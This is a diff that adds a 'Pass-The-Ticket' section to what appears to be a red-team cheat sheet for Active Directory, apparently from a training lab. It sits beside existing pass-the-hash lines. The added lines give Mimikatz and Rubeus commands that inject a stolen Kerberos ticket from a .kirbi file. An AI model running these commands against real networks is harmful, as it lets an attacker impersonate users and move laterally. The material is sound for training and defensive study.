@@ -125,3 +125,19 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:corp.local 
 ```
 .\Rubeus.exe asktgt /domain:dollarcorp.moneycorp.local /user:srvadmin /rc4:a98e18228819e8eec3dfa33cb68b0728 /ptt
 ```
+
+# Pass-The-Ticket
+
+We can use the tickets that are save to a `.kirbi` file. 
+
+* Invoke-Mimikatz
+
+```
+Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
+```
+
+* Rubeus
+
+```powershell
+.\Rubeus.exe ptt /ticket:ticket.kirbi
+```
